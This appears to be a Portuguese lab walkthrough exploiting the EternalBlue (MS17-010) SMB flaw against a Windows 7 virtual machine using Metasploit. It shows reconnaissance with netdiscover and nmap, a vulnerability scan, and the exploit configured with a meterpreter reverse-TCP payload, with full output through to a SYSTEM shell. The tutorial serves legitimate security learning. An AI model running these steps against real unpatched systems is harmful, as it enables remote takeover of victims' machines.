# Explorando o Windows através do EternalBlue

**Exploit desenvolvido originalmente pela NSA (Agência de Segurança Nacional dos EUA)** e que acabou sendo vazado em 2017 pelo grupo de hackers conhecido como *Shadow Brokers*.

### O que ele faz

* Ele explora uma falha crítica no protocolo **SMBv1 (Server Message Block)** do Windows.
* Essa falha foi catalogada como **MS17-010** pela Microsoft.
* O SMBv1 é usado para compartilhamento de arquivos, impressoras e outros recursos em rede.
* O EternalBlue permite que um invasor **envie pacotes maliciosos para um computador vulnerável e execute código remotamente** (sem precisar de login ou senha).

### Impacto

* Foi um dos **exploits mais devastadores** da história recente da segurança da informação.
* Serviu como vetor de propagação de grandes ataques de ransomware, como:

  * **WannaCry** (2017) – se espalhou automaticamente pela rede em poucas horas, afetando hospitais, empresas e governos no mundo todo.
  * **NotPetya** (2017) – causou bilhões de dólares em prejuízos, paralisando multinacionais inteiras.

### Correção

* A Microsoft lançou patches de segurança em **março de 2017** (antes do vazamento público do exploit).
* As atualizações foram disponibilizadas inclusive para versões antigas do Windows que já não tinham mais suporte oficial (como Windows XP e Server 2003), devido à gravidade da falha.

## Scanner do alvo
```
$ sudo netdiscover
 Currently scanning: 192.168.29.0/16   |   Screen View: Unique Hosts                             
                                                                                                 
 7 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 366                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.254   78:3e:a1:89:7d:10      4     222  Nokia Shanghai Bell Co., Ltd.                 
 192.168.1.37    08:00:27:81:e9:65      1      42  PCS Systemtechnik GmbH                        
 192.168.1.32    74:56:3c:97:60:fa      1      60  GIGA-BYTE TECHNOLOGY CO.,LTD.                 
 192.168.1.29    5c:cd:5b:94:a0:d4      1      42  Intel Corporate  
```
IP da máquina alvo: **192.168.1.37**
```
$ nmap -sS -sV 192.168.1.37
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 19:17 -03
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 192.168.1.37
Host is up (0.00089s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:81:E9:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: WIN7-X64; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.62 seconds
```
A máquina pode estar vunerável ao EternalBlue
## Verificando vunerabilidade ##
```
msf6 > search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption                                               
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce                                                                                
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant
```
A ferramenta que utilizaremos para verificar a vunerabilidade: **auxiliary/scanner/smb/smb_ms17_010**
```
msf6 > show info auxiliary/scanner/smb/smb_ms17_010

       Name: MS17-010 SMB RCE Detection
     Module: auxiliary/scanner/smb/smb_ms17_010
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Sean Dillon <sean.dillon@risksense.com>
  Luke Jennings

Check supported:
  No

Basic options:
  Name         Current Setting            Required  Description
  ----         ---------------            --------  -----------
  CHECK_ARCH   true                       no        Check for architecture on vulnerable hosts
  CHECK_DOPU   true                       no        Check for DOUBLEPULSAR on vulnerable hosts
  CHECK_PIPE   false                      no        Check for named pipe on vulnerable hosts
  NAMED_PIPES  /usr/share/metasploit-fra  yes       List of named pipes to check
               mework/data/wordlists/nam
               ed_pipes.txt
  RHOSTS                                  yes       The target host(s), see https://docs.metaspl
                                                    oit.com/docs/using-metasploit/basics/using-m
                                                    etasploit.html
  RPORT        445                        yes       The SMB service port (TCP)
  SMBDomain    .                          no        The Windows domain to use for authentication
  SMBPass                                 no        The password for the specified username
  SMBUser                                 no        The username to authenticate as
  THREADS      1                          yes       The number of concurrent threads (max one pe
                                                    r host)

Description:
  Uses information disclosure to determine if MS17-010 has been patched or not.
  Specifically, it connects to the IPC$ tree and attempts a transaction on FID 0.
  If the status returned is "STATUS_INSUFF_SERVER_RESOURCES", the machine does
  not have the MS17-010 patch.

  If the machine is missing the MS17-010 patch, the module will check for an
  existing DoublePulsar (ring 0 shellcode/malware) infection.

  This module does not require valid SMB credentials in default server
  configurations. It can log on as the user "\" and connect to IPC$.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0144
  https://nvd.nist.gov/vuln/detail/CVE-2017-0145
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://nvd.nist.gov/vuln/detail/CVE-2017-0148
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
  https://github.com/countercept/doublepulsar-detection-script
  https://web.archive.org/web/20170513050203/https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Also known as:
  DOUBLEPULSAR
  ETERNALBLUE
```
`msf6 > use auxiliary/scanner/smb/smb_ms17_010`
```
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting            Required  Description
   ----         ---------------            --------  -----------
   CHECK_ARCH   true                       no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                       no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                      no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-fra  yes       List of named pipes to check
                mework/data/wordlists/nam
                ed_pipes.txt
   RHOSTS                                  yes       The target host(s), see https://docs.metasp
                                                     loit.com/docs/using-metasploit/basics/using
                                                     -metasploit.html
   RPORT        445                        yes       The SMB service port (TCP)
   SMBDomain    .                          no        The Windows domain to use for authenticatio
                                                     n
   SMBPass                                 no        The password for the specified username
   SMBUser                                 no        The username to authenticate as
   THREADS      1                          yes       The number of concurrent threads (max one p
                                                     er host)

View the full module info with the info, or info -d command.
```
```
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.37
RHOSTS => 192.168.1.37
```
```
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 192.168.1.37:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.37:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
A máquina alvo tem a vunerabilidade

## Ataque a máquina alvo
Utilizaremos o exploit: **exploit/windows/smb/ms17_010_eternalblue**
### Montando o ataque
```
msf6 > show info exploit/windows/smb/ms17_010_eternalblue

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Equation Group
  Shadow Brokers
  sleepya
  Sean Dillon <sean.dillon@risksense.com>
  Dylan Davis <dylan.davis@risksense.com>
  thelightcosine
  wvu <wvu@metasploit.com>
  agalway-r7
  cdelafuente-r7
  cdelafuente-r7
  agalway-r7

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic Target
      1   Windows 7
      2   Windows Embedded Standard 7
      3   Windows Server 2008 R2
      4   Windows 8
      5   Windows 8.1
      6   Windows Server 2012
      7   Windows 10 Pro
      8   Windows 10 Enterprise Evaluation

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/
                                            docs/using-metasploit/basics/using-metasploit.html
  RPORT          445              yes       The target port (TCP)
  SMBDomain                       no        (Optional) The Windows domain to use for authenticat
                                            ion. Only affects Windows Server 2008 R2, Windows 7,
                                             Windows Embedded Standard 7 target machines.
  SMBPass                         no        (Optional) The password for the specified username
  SMBUser                         no        (Optional) The username to authenticate as
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
                                             Only affects Windows Server 2008 R2, Windows 7, Win
                                            dows Embedded Standard 7 target machines.
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affe
                                            cts Windows Server 2008 R2, Windows 7, Windows Embed
                                            ded Standard 7 target machines.

Payload information:
  Space: 2000

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit, part of
  the FuzzBunch toolkit released by Shadow Brokers.

  There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
  is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
  DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
  is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
  completed in srvnet!SrvNetWskReceiveComplete.

  This exploit, like the original may not trigger 100% of the time, and should be
  run continuously until triggered. It seems like the pool will get hot streaks
  and need a cool down period before the shells rain in again.

  The module will attempt to use Anonymous login, by default, to authenticate to perform the
  exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use
  those instead.

  On some systems, this module may cause system instability and crashes, such as a BSOD or
  a reboot. This may be more likely with some payloads.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0144
  https://nvd.nist.gov/vuln/detail/CVE-2017-0145
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://nvd.nist.gov/vuln/detail/CVE-2017-0148
  https://github.com/RiskSense-Ops/MS17-010
  https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf
  https://www.exploit-db.com/exploits/42030

Also known as:
  ETERNALBLUE
```
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```
```
msf6 exploit(windows/smb/smb_doublepulsar_rce) > set RHOSTS 192.168.1.37
RHOSTS => 192.168.1.37
```
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.1.37     yes       The target host(s), see https://docs.metasploit.com
                                             /docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentica
                                             tion. Only affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
                                             . Only affects Windows Server 2008 R2, Windows 7, W
                                             indows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only aff
                                             ects Windows Server 2008 R2, Windows 7, Windows Emb
                                             edded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none
                                        )
   LHOST     192.168.1.10     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```
### Executando o ataque
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] 192.168.1.37:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.37:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.37:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.37:445 - The target is vulnerable.
[*] 192.168.1.37:445 - Connecting to target for exploitation.
[+] 192.168.1.37:445 - Connection established for exploitation.
[+] 192.168.1.37:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.37:445 - CORE raw buffer dump (40 bytes)
[*] 192.168.1.37:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp
[*] 192.168.1.37:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic
[*] 192.168.1.37:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
[+] 192.168.1.37:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.37:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.37:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.37:445 - Starting non-paged pool grooming
[+] 192.168.1.37:445 - Sending SMBv2 buffers
[+] 192.168.1.37:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.37:445 - Sending final SMBv2 buffers.
[*] 192.168.1.37:445 - Sending last fragment of exploit packet!
[*] 192.168.1.37:445 - Receiving response from exploit packet
[+] 192.168.1.37:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.37:445 - Sending egg to corrupted connection.
[*] 192.168.1.37:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.1.37
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.37:49160) at 2025-08-28 19:26:22 -0300
[+] 192.168.1.37:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.37:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.37:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: AUTORIDADE NT\SISTEMA

meterpreter > shell
Process 2432 created.
Channel 1 created.
Microsoft Windows [vers�o 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Todos os direitos reservados.

C:\Windows\system32>
```
Entramos com a conta **AUTORIDADE NT\SISTEMA** que é uma conta especial embutida no Windows. 
Criada pelo próprio sistema operacional, não aparece no painel de usuários comuns, e tem privilégios ainda maiores que um administrador local. É usada pelo kernel e pelos serviços essenciais para funcionar.
